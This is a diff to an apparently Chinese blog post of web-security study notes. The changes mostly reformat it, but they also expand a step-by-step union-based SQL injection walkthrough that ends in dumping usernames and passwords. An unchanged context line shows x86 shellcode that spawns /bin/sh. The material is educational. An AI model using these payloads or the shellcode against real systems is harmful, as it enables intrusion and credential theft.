@@ -605,7 +605,7 @@ media_subpath: /blog/assets/ # 资源路径前缀
   + 由于它最初是用来生成一个高权限的shell，因此而得名。虽然现在人们已经远远不满足于生成一个shell，但shellcode的“美名”一直延用至今。
   + 攻击者通过巧妙的编写和设置，利用系统的漏洞将shellcode送入系统中使其得以执行，从而获取特殊权限的执行环境，或给自己设立有特权的帐户，取得目标机器的控制权。 
 
-##### shellcode
+#### shellcode
 
 除了经典的利用 exec() 系统调用执行 /bin/sh 获取 shell 之外，下表列出了Unix/Linux系统中的shellcode经常用到的一些其它系统调用。
 
@@ -623,7 +623,7 @@ media_subpath: /blog/assets/ # 资源路径前缀
 
 + 对此代码进行编译后得到机器码。
 
-```
+```c
 char shellcode[] = “\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh”;
 ```
 
@@ -756,13 +756,64 @@ Web安全可以从以下三个方面进行考虑：**Web服务器的安全、Web
 
 #### SQL注入
 
-+ 判断注入点  [index.php?id](http://www.xxx.com/index.php?id=1)[=1](http://www.xxx.com/index.php?id=1) and 1=1 
-+ 判断列数   [index.php?id](http://www.xxx.com/index.php?id=1)[=1](http://www.xxx.com/index.php?id=1) order by 1
-+ 判断显错点 [index.php?id](http://www.xxx.com/index.php?id=1)[=1](http://www.xxx.com/index.php?id=1) union select 1, 2, 3
-+ 获取数据库名 [index.php?id](http://www.xxx.com/index.php?id=1)[=1](http://www.xxx.com/index.php?id=1) union select 1, database(), 3
-+ 获取表名 
-+ 获取列名 
-+ 获取数据
++ **判断注入点**
+
+  - 通过添加 and 1=1 到URL的查询参数中，如果应用程序的响应没有变化，这可能表明存在注入点。例如：
+
+    ```text
+    http://www.xxx.com/index.php?id=1 and 1=1
+    ```
++ **判断列数**
+
+  - 使用 order by 子句来确定查询结果的列数。例如：
+
+    ```text
+    http://www.xxx.com/index.php?id=1 order by 1
+    ```
+
+  - 逐渐增加数字，直到应用程序的响应时间显著增加，这表明你已经到达了最后一列。
+
++ **判断显错点**
+
+  - 通过使用 union select 语句来查看数据库是否显示错误信息。例如：
+
+    ```text
+    http://www.xxx.com/index.php?id=1 union select 1, 2, 3
+    ```
+
+  - 如果数据库显示错误信息，这可能表明存在显错点，攻击者可以利用这些信息来进一步攻击。
+
++ **获取数据库名**
+
+  - 使用 database() 函数来获取当前数据库的名称。例如：
+
+    ```text
+    http://www.xxx.com/index.php?id=1 union select 1, database(), 3
+    ```
+
++ **获取表名**
+
+  - 使用 show tables 语句来获取数据库中的表名。例如：
+
+    ```text
+    http://www.xxx.com/index.php?id=1 union select 1, (select table_name from information_schema.tables where table_schema=database() limit 0,1), 3
+    ```
+
++ **获取列名**
+
+  - 使用 show columns from [表名] 语句来获取指定表的列名。例如：
+
+    ```text
+    http://www.xxx.com/index.php?id=1 union select 1, (select column_name from information_schema.columns where table_name='users' limit 0,1), 3
+    ```
+
++ **获取数据**
+
+  - 一旦知道了表名和列名，就可以使用select语句来获取数据。例如：
+
+    ```text
+    http://www.xxx.com/index.php?id=1 union select 1, username, password from users
+    ```
 
 ###### 工具 Pangolin（穿山甲）
 
@@ -845,15 +896,15 @@ HTTP指纹识别是为了判断服务器的版本，从而找到服务器的漏�
 
      <img src="https://testingcf.jsdelivr.net/gh/bestZwei/imgs@master/picgo/%7B958BE8D3-70BB-4D42-915B-7A19D567A436%7D.png" style="zoom:67%;" />
 
-     <img src="https://testingcf.jsdelivr.net/gh/bestZwei/imgs@master/picgo/%7B3340226D-2669-43F3-9264-312750747DE3%7D.png" style="zoom:67%;" />
+     <img src="https://testingcf.jsdelivr.net/gh/bestZwei/imgs@master/picgo/%7B3340226D-2669-43F3-9264-312750747DE3%7D.png" style="zoom:64%;" />
 
-     <img src="https://testingcf.jsdelivr.net/gh/bestZwei/imgs@master/picgo/%7B9009CDC5-FAA4-416F-A783-5E76DC9DFC64%7D.png" style="zoom:67%;" />
+     <img src="https://testingcf.jsdelivr.net/gh/bestZwei/imgs@master/picgo/%7B9009CDC5-FAA4-416F-A783-5E76DC9DFC64%7D.png" style="zoom:64%;" />
 
   2. **服务器端网页劫持**
 
-     <img src="https://testingcf.jsdelivr.net/gh/bestZwei/imgs@master/picgo/%7B91F45231-F3C7-4D59-82B7-0A782E942C5D%7D.png" style="zoom:67%;" />
+     <img src="https://testingcf.jsdelivr.net/gh/bestZwei/imgs@master/picgo/%7B91F45231-F3C7-4D59-82B7-0A782E942C5D%7D.png" style="zoom:64%;" />
 
-     <img src="https://testingcf.jsdelivr.net/gh/bestZwei/imgs@master/picgo/%7B0FB15E44-59B9-45B7-8DB8-75A6460624B3%7D.png" style="zoom:67%;" />
+     <img src="https://testingcf.jsdelivr.net/gh/bestZwei/imgs@master/picgo/%7B0FB15E44-59B9-45B7-8DB8-75A6460624B3%7D.png" style="zoom:64%;" />
 
 ##### DNS欺骗
 
@@ -879,9 +930,16 @@ HTTP指纹识别是为了判断服务器的版本，从而找到服务器的漏�
 
 #### 网页验证码
 
-验证码技术属于人机区分问题，这在英文中称为 CAPTCHA，它是是Completely Automated Public Turing Test to Tell Computers and Humans Apart（全自动区分计算机和人类的图灵测试）的简称。
+验证码技术属于人机区分问题，这在英文中称为 **CAPTCHA**，它是是Completely Automated Public Turing Test to Tell Computers and Humans Apart（全自动区分计算机和人类的图灵测试）的简称。
 
 验证码技术的主要思想是必须通过人为参与完成信息提交过程，并且对验证码字体和背景做了相关处理。
+
+##### 验证码的类型
+
+1. 文本验证码：在网页上以文本形式呈现给用户；
+2. 手机验证码：用户在网页上提交自己的手机号码，系统以短信形式将验证码发送到用户手机上；
+3. 邮件验证码：用户在网页上提交自己的电子邮箱，系统以e-mail形式将验证码发送到用户的邮箱中；
+4. 图片验证码：又称“验证水印”，在网页上以图片形式呈现给用户。
 
 ##### 基于验证码的表单提交流程
 
@@ -891,28 +949,19 @@ HTTP指纹识别是为了判断服务器的版本，从而找到服务器的漏�
 
 <img src="https://testingcf.jsdelivr.net/gh/bestZwei/imgs@master/picgo/20241112170040.png" style="zoom:67%;" />
 
-##### 验证码的类型
-
-1. 文本验证码：在网页上以文本形式呈现给用户；
-2. 手机验证码：用户在网页上提交自己的手机号码，系统以短信形式将验证码发送到用户手机上；
-3. 邮件验证码：用户在网页上提交自己的电子邮箱，系统以e-mail形式将验证码发送到用户的邮箱中；
-4. 图片验证码：又称“验证水印”，在网页上以图片形式呈现给用户。
-
 ---
 
 ### 文件上传攻击
 
-[可参考学习](https://www.cnblogs.com/qweg/p/16463113.html)
-
 #### 文件上传漏洞简介
 
-文件上传漏洞是指由于**程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件**。这里上传的文件可以是木马，病毒，恶意脚本或者 WebShell 等。
+文件上传漏洞是指由于**程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件**。这里上传的文件可以是木马，病毒，恶意脚本或者 WebShell 等。 [可参考学习的另一个博客笔记](https://www.cnblogs.com/qweg/p/16463113.html)
 
 这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。
 
 ##### 文件上传绕过方法
 
-<img src="https://testingcf.jsdelivr.net/gh/bestZwei/imgs@master/picgo/20241112174047.png" style="zoom:80%;" />
+<img src="https://testingcf.jsdelivr.net/gh/bestZwei/imgs@master/picgo/20241112174047.png" style="zoom:75%;" />
 
 + 前端JS绕过
 + 文件名过滤绕过
